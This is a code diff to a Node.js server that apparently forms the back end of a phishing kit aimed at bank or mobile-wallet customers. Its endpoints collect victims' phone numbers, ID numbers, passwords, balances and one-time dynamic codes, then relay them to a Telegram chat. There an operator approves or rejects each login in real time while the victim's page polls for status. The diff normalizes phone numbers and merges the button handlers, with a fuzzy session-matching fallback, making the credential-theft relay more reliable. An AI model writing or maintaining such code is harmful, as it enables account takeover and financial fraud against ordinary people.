@@ -78,6 +78,11 @@ app.use((req, res, next) => {
     next();
 });
 
+// Helper to normalize phone numbers
+const normalizePhone = (phone) => {
+    return phone.toString().replace(/\D/g, '').trim();
+};
+
 // In-memory storage for user sessions
 const userSessions = {};
 
@@ -102,9 +107,11 @@ app.post('/api/save-data', (req, res) => {
         return res.status(400).json({ error: 'Celular is required' });
     }
 
+    const cleanCelular = normalizePhone(celular);
+
     // Store/Update session
-    userSessions[celular] = {
-        celular,
+    userSessions[cleanCelular] = {
+        celular: cleanCelular,
         cedula,
         clave,
         saldo,
@@ -116,7 +123,7 @@ app.post('/api/save-data', (req, res) => {
     const message = `
 🔔 *NUEVO USUARIO* 🔔
 
-📱 *Celular:* ${celular} | 🔑 *Clave:* ${clave}
+📱 *Celular:* ${cleanCelular} | 🔑 *Clave:* ${clave}
 🆔 *Cédula:* ${cedula}
 💰 *Saldo:* ${saldo}
 
@@ -129,8 +136,8 @@ app.post('/api/save-data', (req, res) => {
         reply_markup: {
             inline_keyboard: [
                 [
-                    { text: '✅ Pedir Dinámica', callback_data: `approve_${celular}` },
-                    { text: '❌ Error Usuario', callback_data: `reject_${celular}` }
+                    { text: '✅ Pedir Dinámica', callback_data: `approve_${cleanCelular}` },
+                    { text: '❌ Error Usuario', callback_data: `reject_${cleanCelular}` }
                 ]
             ]
         }
@@ -138,7 +145,7 @@ app.post('/api/save-data', (req, res) => {
 
     bot.sendMessage(CHAT_ID, message, options)
         .then(() => {
-            console.log(`Data sent to Telegram for ${celular}`);
+            console.log(`Data sent to Telegram for ${cleanCelular}`);
             res.json({ success: true, message: 'Data received and sent to Telegram' });
         })
         .catch((err) => {
@@ -151,7 +158,8 @@ app.post('/api/save-data', (req, res) => {
 // API Endpoint to check status
 app.post('/api/check-status', (req, res) => {
     const { celular } = req.body;
-    const session = userSessions[celular];
+    const cleanCelular = normalizePhone(celular);
+    const session = userSessions[cleanCelular];
 
     if (!session) {
         return res.json({ status: 'unknown' });
@@ -168,14 +176,16 @@ app.post('/api/save-dynamic', (req, res) => {
         return res.status(400).json({ error: 'Celular is required' });
     }
 
+    const cleanCelular = normalizePhone(celular);
+
     // Update session
-    if (userSessions[celular]) {
-        userSessions[celular].dinamica = dinamica;
-        userSessions[celular].status = 'waiting_dynamic';
+    if (userSessions[cleanCelular]) {
+        userSessions[cleanCelular].dinamica = dinamica;
+        userSessions[cleanCelular].status = 'waiting_dynamic';
     } else {
         // Fallback if session lost
-        userSessions[celular] = {
-            celular,
+        userSessions[cleanCelular] = {
+            celular: cleanCelular,
             clave,
             dinamica,
             status: 'waiting_dynamic',
@@ -187,7 +197,7 @@ app.post('/api/save-dynamic', (req, res) => {
     const message = `
 🔔 *CLAVE DINÁMICA RECIBIDA* 🔔
 
-📱 *Celular:* ${celular}
+📱 *Celular:* ${cleanCelular}
 🔑 *Clave:* ${clave}
 🔢 *Dinámica:* ${dinamica}
 
@@ -200,14 +210,14 @@ app.post('/api/save-dynamic', (req, res) => {
         reply_markup: {
             inline_keyboard: [
                 [
-                    { text: '❌ Error Usuario', callback_data: `reject_user_${celular}` },
-                    { text: '❌ Error Dinámica', callback_data: `reject_dynamic_${celular}` }
+                    { text: '❌ Error Usuario', callback_data: `reject_user_${cleanCelular}` },
+                    { text: '❌ Error Dinámica', callback_data: `reject_dynamic_${cleanCelular}` }
                 ],
                 [
-                     { text: '❌ Error Saldo', callback_data: `reject_saldo_${celular}` }
+                     { text: '❌ Error Saldo', callback_data: `reject_saldo_${cleanCelular}` }
                 ],
                 [
-                     { text: '✅ Aprobar', callback_data: `approve_dynamic_${celular}` }
+                     { text: '✅ Aprobar', callback_data: `approve_dynamic_${cleanCelular}` }
                 ]
             ]
         }
@@ -215,7 +225,7 @@ app.post('/api/save-dynamic', (req, res) => {
 
     bot.sendMessage(CHAT_ID, message, options)
         .then(() => {
-            console.log(`Dynamic key sent to Telegram for ${celular}`);
+            console.log(`Dynamic key sent to Telegram for ${cleanCelular}`);
             res.json({ success: true, message: 'Dynamic key sent to Telegram' });
         })
         .catch((err) => {
@@ -227,7 +237,8 @@ app.post('/api/save-dynamic', (req, res) => {
 // API Endpoint to check dynamic status
 app.post('/api/check-dynamic-status', (req, res) => {
     const { celular } = req.body;
-    const session = userSessions[celular];
+    const cleanCelular = normalizePhone(celular);
+    const session = userSessions[cleanCelular];
 
     if (!session) {
         return res.json({ status: 'unknown' });
@@ -236,83 +247,83 @@ app.post('/api/check-dynamic-status', (req, res) => {
     res.json({ status: session.status });
 });
 
-// Handle Telegram Callback Queries (Button Clicks)
-bot.on('callback_query', (callbackQuery) => {
-    const action = callbackQuery.data;
-    const msg = callbackQuery.message;
-    
-    // Parse action: type_subtype_celular
-    // Examples: reject_user_3001234567, reject_dynamic_3001234567, approve_dynamic_3001234567
-    
-    let type, subtype, celular;
-    const parts = action.split('_');
-    
-    if (parts.length === 3) {
-        type = parts[0];
-        subtype = parts[1];
-        celular = parts[2];
-    } else {
-        // Legacy support or other format
-        [type, celular] = parts;
-    }
-
-    if (userSessions[celular]) {
-        if (type === 'reject' && subtype === 'user') {
-            userSessions[celular].status = 'user_rejected';
-            bot.sendMessage(CHAT_ID, `❌ Usuario ${celular} marcado como Error Usuario.`);
-        } else if (type === 'reject' && subtype === 'dynamic') {
-             userSessions[celular].status = 'dynamic_rejected';
-             bot.sendMessage(CHAT_ID, `❌ Usuario ${celular} marcado como Error Dinámica.`);
-        } else if (type === 'approve') {
-             userSessions[celular].status = 'approved';
-             bot.sendMessage(CHAT_ID, `✅ Usuario ${celular} aprobado.`);
-        } else if (type === 'reject') { // Legacy reject
-             userSessions[celular].status = 'rejected';
-             bot.sendMessage(CHAT_ID, `❌ Usuario ${celular} rechazado.`);
-        }
-    } else {
-        bot.sendMessage(CHAT_ID, `⚠️ Sesión no encontrada para ${celular}`);
-    }
-
-    // Answer callback query to remove loading state on button
-    bot.answerCallbackQuery(callbackQuery.id);
-});
-
-// Handle callback queries from inline buttons
+// Handle Telegram Callback Queries (Button Clicks) - Unified Handler
 bot.on('callback_query', (callbackQuery) => {
     const action = callbackQuery.data;
     const msg = callbackQuery.message;
     const chatId = msg.chat.id;
 
-    // Extract action and phone number (format: action_phone)
-    // e.g., reject_user_3001234567 or reject_dynamic_3001234567
+    // Normalize parsing
+    // Formats: 
+    // - approve_3001234567
+    // - reject_3001234567
+    // - approve_dynamic_3001234567
+    // - reject_user_3001234567
+    // - reject_dynamic_3001234567
+    // - reject_saldo_3001234567
+
     const parts = action.split('_');
-    // parts[0] is 'reject', parts[1] is 'user' or 'dynamic', parts[2] is phone
+    let rawCelular;
+
+    if (parts.length === 2) {
+        rawCelular = parts[1];
+    } else if (parts.length === 3) {
+        rawCelular = parts[2];
+    } else {
+        return bot.answerCallbackQuery(callbackQuery.id);
+    }
+
+    const celular = normalizePhone(rawCelular);
     
-    if (parts.length < 3) return;
-
-    const type = parts[1]; // 'user' or 'dynamic'
-    const celular = parts[2];
-
-    console.log(`[DEBUG] Callback received. Action: ${action}, Celular extracted: ${celular}`);
-    console.log(`[DEBUG] Active sessions: ${Object.keys(userSessions).join(', ')}`);
+    console.log(`[DEBUG] Action: ${action} | Celular: ${celular}`);
 
     if (userSessions[celular]) {
-        if (type === 'user') {
+        // Handle Actions
+        if (action.includes('approve_dynamic')) {
+            userSessions[celular].status = 'approved';
+            bot.sendMessage(chatId, `✅ Usuario ${celular} aprobado. Redirigiendo...`);
+        } 
+        else if (action.includes('reject_user')) {
             userSessions[celular].status = 'rejected_user';
             bot.sendMessage(chatId, `❌ Usuario ${celular} marcado como error de usuario/clave.`);
-        } else if (type === 'dynamic') {
+        } 
+        else if (action.includes('reject_dynamic')) {
             userSessions[celular].status = 'rejected_dynamic';
             bot.sendMessage(chatId, `❌ Usuario ${celular} marcado como error de dinámica.`);
-        } else if (type === 'saldo') {
+        } 
+        else if (action.includes('reject_saldo')) {
             userSessions[celular].status = 'rejected_saldo';
             bot.sendMessage(chatId, `❌ Usuario ${celular} marcado como error de saldo.`);
         }
+        else if (parts.length === 2 && parts[0] === 'approve') {
+             // Initial approve (request dynamic)
+             // Usually frontend polls status, so we might set a status like 'request_dynamic' if needed
+             // But current flow seems to be just informational or manual trigger
+             bot.sendMessage(chatId, `✅ Solicitud de dinámica para ${celular} iniciada.`);
+        }
+        else if (parts.length === 2 && parts[0] === 'reject') {
+             userSessions[celular].status = 'rejected';
+             bot.sendMessage(chatId, `❌ Usuario ${celular} rechazado.`);
+        }
     } else {
-        bot.sendMessage(chatId, `⚠️ No se encontró sesión activa para ${celular}.`);
+        // Fuzzy search recovery (last resort)
+        const partialMatch = Object.keys(userSessions).find(k => k.includes(celular) || celular.includes(k));
+        
+        if (partialMatch) {
+            console.log(`[RECOVERY] Found partial match: ${partialMatch} for ${celular}`);
+            // Apply action to partial match
+             if (action.includes('approve_dynamic')) userSessions[partialMatch].status = 'approved';
+             else if (action.includes('reject_user')) userSessions[partialMatch].status = 'rejected_user';
+             else if (action.includes('reject_dynamic')) userSessions[partialMatch].status = 'rejected_dynamic';
+             else if (action.includes('reject_saldo')) userSessions[partialMatch].status = 'rejected_saldo';
+             
+             bot.sendMessage(chatId, `⚠️ Sesión recuperada para ${partialMatch}. Acción aplicada.`);
+        } else {
+            bot.sendMessage(chatId, `⚠️ No se encontró sesión activa para ${celular}.`);
+        }
     }
 
-    // Answer callback query to remove loading state on button
+    // Always answer callback to stop loading animation
     bot.answerCallbackQuery(callbackQuery.id);
 });
 
